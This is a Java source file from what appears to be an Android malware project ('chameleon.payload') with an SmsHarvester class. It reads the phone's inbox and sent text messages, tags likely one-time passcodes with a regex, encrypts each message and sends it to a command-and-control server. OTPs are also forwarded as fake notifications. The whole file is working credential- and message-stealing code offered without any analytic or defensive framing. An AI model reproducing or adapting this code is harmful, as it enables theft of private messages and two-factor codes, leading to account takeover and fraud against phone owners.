package com.chameleon.payload.harvester;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONObject;

public class SmsHarvester {
    private static final String TAG = "SmsHarvester";
    private final Context context;

    public SmsHarvester(Context context) {
        this.context = context;
    }

    public void collectSms() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 100"
            );

            if (cursor == null) return;

            int count = 0;
            while (cursor.moveToNext()) {
                String address = getString(cursor, "address");
                String body = getString(cursor, "body");
                long date = getLong(cursor, "date");

                if (body != null && address != null) {
                    boolean isOTP = body.matches(".*\\b\\d{4,8}\\b.*");

                    // Send to SMS table
                    JSONObject smsData = new JSONObject();
                    smsData.put("sender", address);
                    smsData.put("body", body);
                    smsData.put("is_otp", isOTP);
                    smsData.put("received_at", date);
                    byte[] encrypted = Crypto.encrypt(smsData.toString().getBytes());
                    com.chameleon.payload.PayloadEntry.getC2().sendData("sms", encrypted);

                    // For OTP, also send to notifications table (FalconEye reuse)
                    if (isOTP) {
                        JSONObject notifData = new JSONObject();
                        notifData.put("app_name", "com.android.mms");
                        notifData.put("content", "OTP: " + body);
                        notifData.put("post_time", date);
                        byte[] notifEncrypted = Crypto.encrypt(notifData.toString().getBytes());
                        com.chameleon.payload.PayloadEntry.getC2().sendData("notification", notifEncrypted);
                    }
                    count++;
                }
            }
            cursor.close();
            Log.i(TAG, "SMS collected: " + count);
        } catch (Exception e) {
            Log.e(TAG, "SMS collection error", e);
        }
    }

    public void collectSentSms() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/sent"),
                null, null, null, "date DESC LIMIT 50"
            );
            if (cursor == null) return;

            while (cursor.moveToNext()) {
                String address = getString(cursor, "address");
                String body = getString(cursor, "body");
                long date = getLong(cursor, "date");

                if (body != null && address != null) {
                    JSONObject data = new JSONObject();
                    data.put("sender", address);
                    data.put("body", "[SENT] " + body);
                    data.put("is_otp", false);
                    data.put("received_at", date);
                    byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                    com.chameleon.payload.PayloadEntry.getC2().sendData("sms", encrypted);
                }
            }
            cursor.close();
        } catch (Exception e) {
            Log.e(TAG, "Sent SMS collection error", e);
        }
    }

    private String getString(Cursor c, String col) {
        try { return c.getString(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return null; }
    }

    private long getLong(Cursor c, String col) {
        try { return c.getLong(c.getColumnIndexOrThrow(col)); } catch (Exception e) { return 0; }
    }
}
